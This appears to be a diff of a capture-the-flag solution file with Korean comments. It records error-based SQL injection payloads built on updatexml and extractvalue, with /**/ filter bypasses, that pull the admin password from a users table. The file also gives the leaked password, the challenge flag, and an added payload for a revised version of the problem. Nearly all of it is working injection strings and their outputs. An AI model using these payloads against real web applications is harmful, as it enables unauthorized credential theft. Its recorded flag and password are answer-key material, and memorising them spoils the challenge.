@@ -14,5 +14,9 @@ pay: %27||updatexml(null,concat(0x3a,(select/**/pw/**/from/**/users/**/where/**/
 res: XPATH syntax error: ':N0named123'		# admin의 비밀번호
 # '||updatexml(null,concat(0x3a,(select/**/pw/**/from/**/users/**/limit/**/1)),null)#                         # 사실 이 페이로드도 쌉가능 
 
+
 pay: N0named123
 res: EWHA{do_u_know_super_son?_do_u_know_kimchi?}
+
+--------------------문제 수정-------------------
+Pay: %27||id=%27admin%27%26%26extractvalue(1,concat(0x3a,(select/**/pw/**/from/**/users/**/limit/**/1,1)))%23
